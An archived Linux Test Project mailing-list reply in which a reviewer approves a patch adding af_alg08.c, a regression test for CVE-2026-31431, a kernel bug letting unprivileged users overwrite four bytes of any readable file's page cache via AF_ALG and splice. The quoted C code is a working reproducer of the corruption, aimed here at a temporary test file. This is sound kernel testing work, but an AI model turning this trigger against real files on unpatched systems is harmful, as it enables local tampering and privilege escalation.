Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 49B9CFF8873
	for <ltp@archiver.kernel.org>; Thu, 30 Apr 2026 14:07:20 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id B7FA93E6C88
	for <ltp@archiver.kernel.org>; Thu, 30 Apr 2026 16:07:18 +0200 (CEST)
Received: from in-7.smtp.seeweb.it (in-7.smtp.seeweb.it [217.194.8.7])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (secp384r1))
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id 7E0723E535D
 for <ltp@lists.linux.it>; Thu, 30 Apr 2026 16:06:59 +0200 (CEST)
Received: from smtp-out2.suse.de (smtp-out2.suse.de
 [IPv6:2a07:de40:b251:101:10:150:64:2])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by in-7.smtp.seeweb.it (Postfix) with ESMTPS id BAD64200DA2
 for <ltp@lists.linux.it>; Thu, 30 Apr 2026 16:06:58 +0200 (CEST)
Received: from imap1.dmz-prg2.suse.org (imap1.dmz-prg2.suse.org
 [IPv6:2a07:de40:b281:104:10:150:64:97])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by smtp-out2.suse.de (Postfix) with ESMTPS id 5922A5BD0A;
 Thu, 30 Apr 2026 14:06:57 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.cz; s=susede2_rsa;
 t=1777558017; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
 bh=gwG58AjmDVCPs3BJO+8826uxbXHXQs5AwgEf+bXj8X4=;
 b=yGIjHSQkFqHetx+6zdfGM9SqWy4M18BqdRBQV3lc5B2HWm/iBgAYkGGeCjlPSBGEegiGaK
 22l1eBXcC86jXtS2CVHGe+iMaf6GCwgI8cyuxs4K5IT4xsKM4yas4S/5I5BHiFuTWMT3KR
 yTDZnFL1Sla0DwqWLrKfeirmuXHFYDU=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.cz;
 s=susede2_ed25519; t=1777558017;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
 bh=gwG58AjmDVCPs3BJO+8826uxbXHXQs5AwgEf+bXj8X4=;
 b=BIpZXST2QC4V70InNpD1bu6MY62fNi2pxZgiJGKUrInHHWnguUaNcZ/6Ycsy87M+OyHda0
 4h8TbNm9CHokHUAA==
Authentication-Results: smtp-out2.suse.de;
 dkim=pass header.d=suse.cz header.s=susede2_rsa header.b=yGIjHSQk;
 dkim=pass header.d=suse.cz header.s=susede2_ed25519 header.b=BIpZXST2
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.cz; s=susede2_rsa;
 t=1777558017; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
 bh=gwG58AjmDVCPs3BJO+8826uxbXHXQs5AwgEf+bXj8X4=;
 b=yGIjHSQkFqHetx+6zdfGM9SqWy4M18BqdRBQV3lc5B2HWm/iBgAYkGGeCjlPSBGEegiGaK
 22l1eBXcC86jXtS2CVHGe+iMaf6GCwgI8cyuxs4K5IT4xsKM4yas4S/5I5BHiFuTWMT3KR
 yTDZnFL1Sla0DwqWLrKfeirmuXHFYDU=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.cz;
 s=susede2_ed25519; t=1777558017;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
 bh=gwG58AjmDVCPs3BJO+8826uxbXHXQs5AwgEf+bXj8X4=;
 b=BIpZXST2QC4V70InNpD1bu6MY62fNi2pxZgiJGKUrInHHWnguUaNcZ/6Ycsy87M+OyHda0
 4h8TbNm9CHokHUAA==
Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id 4E619593B0;
 Thu, 30 Apr 2026 14:06:57 +0000 (UTC)
Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
 by imap1.dmz-prg2.suse.org with ESMTPSA id 33PAEgFi82l0XQAAD6G6ig
 (envelope-from <mdoucha@suse.cz>); Thu, 30 Apr 2026 14:06:57 +0000
Message-ID: <605015be-e527-4cd1-b541-7721a3ba4327@suse.cz>
Date: Thu, 30 Apr 2026 16:06:52 +0200
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
To: Andrea Cervesato <andrea.cervesato@suse.de>,
 Linux Test Project <ltp@lists.linux.it>
References: <20260430-cve-2026-31431-v2-0-1136c09ca67b@suse.com>
 <20260430-cve-2026-31431-v2-2-1136c09ca67b@suse.com>
Content-Language: en-US
From: Martin Doucha <mdoucha@suse.cz>
Autocrypt: addr=mdoucha@suse.cz; keydata=
 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 ag==
In-Reply-To: <20260430-cve-2026-31431-v2-2-1136c09ca67b@suse.com>
X-Rspamd-Action: no action
X-Rspamd-Server: rspamd2.dmz-prg2.suse.org
X-Spamd-Result: default: False [-4.51 / 50.00]; BAYES_HAM(-3.00)[100.00%];
 NEURAL_HAM_LONG(-1.00)[-1.000];
 R_DKIM_ALLOW(-0.20)[suse.cz:s=susede2_rsa,suse.cz:s=susede2_ed25519];
 NEURAL_HAM_SHORT(-0.20)[-1.000]; MIME_GOOD(-0.10)[text/plain];
 MX_GOOD(-0.01)[]; TO_DN_ALL(0.00)[]; MIME_TRACE(0.00)[0:+];
 FUZZY_RATELIMITED(0.00)[rspamd.com];
 DKIM_SIGNED(0.00)[suse.cz:s=susede2_rsa,suse.cz:s=susede2_ed25519];
 RCPT_COUNT_TWO(0.00)[2]; ARC_NA(0.00)[];
 TO_MATCH_ENVRCPT_ALL(0.00)[]; FROM_HAS_DN(0.00)[];
 RCVD_TLS_ALL(0.00)[]; RCVD_COUNT_TWO(0.00)[2];
 FROM_EQ_ENVFROM(0.00)[];
 SPAMHAUS_XBL(0.00)[2a07:de40:b281:104:10:150:64:97:from];
 DNSWL_BLOCKED(0.00)[2a07:de40:b281:106:10:150:64:167:received];
 RCVD_VIA_SMTP_AUTH(0.00)[]; MID_RHS_MATCH_FROM(0.00)[];
 DKIM_TRACE(0.00)[suse.cz:+];
 DBL_BLOCKED_OPENRESOLVER(0.00)[suse.com:email, imap1.dmz-prg2.suse.org:helo,
 imap1.dmz-prg2.suse.org:rdns]
X-Rspamd-Queue-Id: 5922A5BD0A
X-Virus-Scanned: clamav-milter 1.0.9 at in-7.smtp.seeweb.it
X-Virus-Status: Clean
Subject: Re: [LTP] [PATCH v2 2/2] cve-2026-31431: Add page cache corruption
 reproducer
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Content-Transfer-Encoding: 7bit
Content-Type: text/plain; charset="us-ascii"; Format="flowed"
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

Hi,
let's add the test to runtest/crypto as well during merge. One minor nit 
below, otherwise for both patches:

Reviewed-by: Martin Doucha <mdoucha@suse.cz>

On 4/30/26 15:30, Andrea Cervesato wrote:
> From: Andrea Cervesato <andrea.cervesato@suse.com>
> 
> A logic bug in authencesn allows an unprivileged user to corrupt
> 4 bytes of page cache via AF_ALG + splice. The test writes known
> data to a file, attempts corruption through the AEAD scratch-write
> path, and verifies whether the file content was modified.
> 
> Tested-by: Avinesh Kumar <avinesh.kumar@suse.com>
> Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
> ---
>   runtest/cve                        |   1 +
>   testcases/kernel/crypto/.gitignore |   1 +
>   testcases/kernel/crypto/af_alg08.c | 164 +++++++++++++++++++++++++++++++++++++
>   3 files changed, 166 insertions(+)
> 
> diff --git a/runtest/cve b/runtest/cve
> index c3ecd74dd9f837924b810b7b431ebb911d809966..74300fb546a071ef2d1de3a02549eed35c9a57a4 100644
> --- a/runtest/cve
> +++ b/runtest/cve
> @@ -93,3 +93,4 @@ cve-2022-0185 fsconfig03
>   cve-2022-4378 cve-2022-4378
>   cve-2025-38236 cve-2025-38236
>   cve-2025-21756 cve-2025-21756
> +cve-2026-31431 af_alg08
> diff --git a/testcases/kernel/crypto/.gitignore b/testcases/kernel/crypto/.gitignore
> index 448f986a6acc1341eac052ae9663e8fe28e18d4d..aca016b62110b319eb2825669ce23f5b3608c73e 100644
> --- a/testcases/kernel/crypto/.gitignore
> +++ b/testcases/kernel/crypto/.gitignore
> @@ -5,6 +5,7 @@ af_alg04
>   af_alg05
>   af_alg06
>   af_alg07
> +af_alg08
>   pcrypt_aead01
>   crypto_user01
>   crypto_user02
> diff --git a/testcases/kernel/crypto/af_alg08.c b/testcases/kernel/crypto/af_alg08.c
> new file mode 100644
> index 0000000000000000000000000000000000000000..06166b6244c1d72e03e3ff8d7e87b1b3b76e93a9
> --- /dev/null
> +++ b/testcases/kernel/crypto/af_alg08.c
> @@ -0,0 +1,164 @@
> +// SPDX-License-Identifier: GPL-2.0-or-later
> +/*
> + * Copyright (C) 2026 SUSE LLC Andrea Cervesato <andrea.cervesato@suse.com>
> + */
> +
> +/*\
> + * Test for CVE-2026-31431 ("Copy Fail") fixed in kernel v7.0:
> + * a664bf3d603d ("crypto: algif_aead - Separate src from dst")
> + *
> + * A logic bug in authencesn, the kernel's AEAD wrapper for IPsec Extended
> + * Sequence Numbers, allows an unprivileged user to write 4 controlled bytes
> + * into the page cache of any readable file. During AEAD decryption,
> + * authencesn uses the destination scatterlist as scratch space for ESN byte
> + * rearrangement. When data is spliced from a file into an AF_ALG socket, the
> + * 2017 in-place optimization (72548b093ee3) places page cache pages into the
> + * writable destination scatterlist. authencesn's scratch write then corrupts
> + * those pages.
> + *
> + * The test creates a file with known data, attempts page cache corruption via
> + * the AF_ALG + splice technique, and verifies whether the file content was
> + * modified.
> + *
> + * Reproducer based on:
> + * https://github.com/theori-io/copy-fail-CVE-2026-31431
> + */
> +
> +#include "tst_test.h"
> +#include "tst_af_alg.h"
> +#include "lapi/socket.h"
> +#include "lapi/splice.h"
> +
> +#define TESTFILE "copy_fail"
> +#define OVERWRITE_SIZE 4
> +#define AEAD_AUTHSIZE 4
> +#define AEAD_ASSOCLEN 8
> +#define AES_IV_SIZE 16
> +#define SPI_SIZE 4
> +
> +static const uint8_t original[OVERWRITE_SIZE] = { 'X', 'X', 'X', 'X' };
> +static const uint8_t payload[OVERWRITE_SIZE] = { 'P', 'W', 'N', 'D' };
> +
> +/*
> + * authenc key format: struct rtattr header (8 bytes) +
> + * HMAC-SHA256 key (16 bytes) + AES-128 key (16 bytes)
> + */
> +static const uint8_t authenc_key[] = {
> +	0x08, 0x00, 0x01, 0x00,
> +	0x00, 0x00, 0x00, 0x10,
> +	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
> +	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
> +	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
> +	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
> +};
> +
> +static int algfd = -1;
> +static int reqfd = -1;
> +static int pipefd[2] = { -1, -1 };
> +static int file_fd = -1;
> +
> +static void try_corrupt(void)
> +{
> +	const uint8_t iv[AES_IV_SIZE] = { 0 };
> +	uint8_t aad[AEAD_ASSOCLEN];
> +	char recvbuf[AEAD_ASSOCLEN];
> +	loff_t off_in = 0;
> +
> +	algfd = -1;
> +	reqfd = -1;
> +	pipefd[0] = -1;
> +	pipefd[1] = -1;
> +
> +	/* AAD[0..3] = SPI (don't care), AAD[4..7] = ESN scratch-write zone */
> +	memset(aad, 'A', SPI_SIZE);
> +	memcpy(aad + SPI_SIZE, payload, OVERWRITE_SIZE);
> +
> +	algfd = tst_alg_setup("aead", "authencesn(hmac(sha256),cbc(aes))",
> +			      authenc_key, sizeof(authenc_key));
> +	SAFE_SETSOCKOPT(algfd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL,
> +			AEAD_AUTHSIZE);
> +
> +	reqfd = tst_alg_accept(algfd);
> +
> +	const struct tst_alg_sendmsg_params params = {
> +		.decrypt = true,
> +		.iv = iv,
> +		.ivlen = AES_IV_SIZE,
> +		.assoclen = AEAD_ASSOCLEN,
> +		.msg_flags = MSG_MORE,
> +	};
> +
> +	tst_alg_sendmsg(reqfd, aad, sizeof(aad), &params);
> +
> +	SAFE_PIPE(pipefd);
> +
> +	TEST(splice(file_fd, &off_in, pipefd[1], NULL, OVERWRITE_SIZE, 0));
> +	if (TST_RET < 0)
> +		tst_brk(TBROK | TTERRNO, "splice(file -> pipe)");
> +
> +	TEST(splice(pipefd[0], NULL, reqfd, NULL, OVERWRITE_SIZE, 0));
> +	if (TST_RET < 0)
> +		tst_brk(TBROK | TTERRNO, "splice(pipe -> AF_ALG)");
> +
> +	/* Expected to fail (invalid ciphertext); triggers the scratch write */
> +	TST_EXP_FAIL_SILENT(recv(reqfd, recvbuf, sizeof(recvbuf), 0), EBADMSG);
> +
> +	SAFE_CLOSE(pipefd[0]);
> +	SAFE_CLOSE(pipefd[1]);
> +	SAFE_CLOSE(reqfd);
> +	SAFE_CLOSE(algfd);
> +}
> +
> +static void run(void)
> +{
> +	int fd;
> +	uint8_t readback[OVERWRITE_SIZE];
> +
> +	fd = SAFE_OPEN(TESTFILE, O_WRONLY | O_CREAT, 0444);
> +	SAFE_WRITE(SAFE_WRITE_ALL, fd, original, OVERWRITE_SIZE);
> +	SAFE_CLOSE(fd);

Nit: Please use file_fd here.

> +
> +	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
> +	try_corrupt();
> +	SAFE_CLOSE(file_fd);
> +
> +	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
> +	SAFE_READ(1, file_fd, readback, sizeof(readback));
> +	SAFE_CLOSE(file_fd);
> +
> +	if (memcmp(readback, original, OVERWRITE_SIZE) != 0)
> +		tst_res(TFAIL, "Page cache was corrupted via AF_ALG splice");
> +	else
> +		tst_res(TPASS, "Page cache was not corrupted");
> +
> +	SAFE_UNLINK(TESTFILE);
> +}
> +
> +static void cleanup(void)
> +{
> +	if (pipefd[0] != -1)
> +		SAFE_CLOSE(pipefd[0]);
> +
> +	if (pipefd[1] != -1)
> +		SAFE_CLOSE(pipefd[1]);
> +
> +	if (reqfd != -1)
> +		SAFE_CLOSE(reqfd);
> +
> +	if (algfd != -1)
> +		SAFE_CLOSE(algfd);
> +
> +	if (file_fd != -1)
> +		SAFE_CLOSE(file_fd);
> +}
> +
> +static struct tst_test test = {
> +	.test_all = run,
> +	.cleanup = cleanup,
> +	.needs_tmpdir = 1,
> +	.tags = (const struct tst_tag[]) {
> +		{"linux-git", "a664bf3d603d"},
> +		{"CVE", "2026-31431"},
> +		{}
> +	},
> +};
> 


-- 
Martin Doucha   mdoucha@suse.cz
SW Quality Engineer
SUSE LINUX, s.r.o.
CORSO IIa
Krizikova 148/34
186 00 Prague 8
Czech Republic

-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
